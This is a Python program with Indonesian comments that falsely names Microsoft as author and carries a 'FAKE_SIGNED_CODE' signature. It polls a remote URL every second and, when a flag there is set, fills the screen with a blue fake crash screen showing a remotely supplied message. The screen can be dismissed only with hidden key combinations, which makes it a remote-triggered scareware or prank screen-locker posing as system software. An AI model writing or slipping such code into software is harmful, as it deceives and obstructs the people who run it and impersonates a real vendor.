"""
main.py - Program GUI System.

Author: Microsoft
Version: 1.0.0
Signature: FAKE_SIGNED_CODE
"""

import tkinter as tk
import sys
import time
import threading
import json
import os
import requests

# URL untuk mengambil mode JSON
MODE_FILE_URL = "https://py-system.vercel.app/mode.json"

# Inisialisasi global
mode = False  # Default mode
gui_thread = None  # Referensi untuk thread GUI
terminate_gui = threading.Event()  # Event untuk mengontrol penghentian GUI

def create_fake_error(message):
    """Fungsi untuk menampilkan layar error GUI dengan pesan dari JSON."""
    global terminate_gui

    root = tk.Tk()
    root.attributes('-fullscreen', True)
    root.configure(bg='blue')

    # Label Error
    error_label = tk.Label(
        root,
        text=message,
        fg="white",
        bg="blue",
        font=("Consolas", 20, "bold"),
        justify="center"
    )
    error_label.pack(expand=True)

    def close_app(event=None):
        sys.exit()

    root.bind("<Control-b>", close_app)
    root.bind("<Control-B>", close_app)
    root.bind("<Control-K>", close_app)

    def check_termination():
        if terminate_gui.is_set():
            root.destroy()
        else:
            root.after(100, check_termination)

    root.after(100, check_termination)
    root.mainloop()


def fetch_mode_and_message_from_url():
    """Mengambil nilai mode dan message dari URL JSON."""
    try:
        response = requests.get(MODE_FILE_URL)
        response.raise_for_status()
        data = response.json()
        return data.get("mode", False), data.get("message", "No message available")
    except requests.exceptions.RequestException as e:
        print(f"Error fetching data from URL: {e}")
        return False, "Error fetching data"


def manage_gui():
    """Memantau perubahan mode dan memulai/menghentikan GUI."""
    global mode, gui_thread, terminate_gui

    while True:
        new_mode, new_message = fetch_mode_and_message_from_url()
        if new_mode != mode:
            mode = new_mode
            if mode:
                print("Starting GUI...")
                terminate_gui.clear()
                gui_thread = threading.Thread(target=create_fake_error, args=(new_message,), daemon=True)
                gui_thread.start()
            else:
                print("Stopping GUI...")
                terminate_gui.set()
                if gui_thread:
                    gui_thread.join()
        time.sleep(1)


if __name__ == "__main__":
    try:
        threading.Thread(target=manage_gui, daemon=True).start()
        print("Monitoring mode changes. Press Ctrl+C to stop.")
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nApplication stopped.")
        sys.exit()
